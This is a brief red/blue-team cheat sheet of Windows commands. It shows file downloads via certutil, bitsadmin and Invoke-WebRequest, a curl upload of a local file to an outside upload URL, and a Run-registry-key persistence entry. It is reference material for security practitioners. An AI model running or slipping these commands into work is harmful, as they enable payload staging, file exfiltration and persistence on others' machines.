# snippets
red and blueteam snippets

### downloading files
```powershell
certutil -f -split -urlcache http://example.com/myfile.txt C:\myfile.txt 
powershell iwr -uri http://example.com/myfile.txt -OutFile C:\myfile.txt
powershell Invoke-WebRequest -Uri "https://example.com/file.exe" -OutFile "C:\Temp\file.exe"

bitsadmin /transfer MyJob /download /priority normal ^
https://example.com/file.exe ^
C:\Downloads\file.exe


```

### uploading a file with curl
``` powershell
curl -F file=@C:\myfile.txt http://website.com/upload
```

### add a program to startup
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
 /v MyProgram ^
 /t REG_SZ ^
 /d "\"C:\Path\To\MyProgram.exe\"" ^
 /f

 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

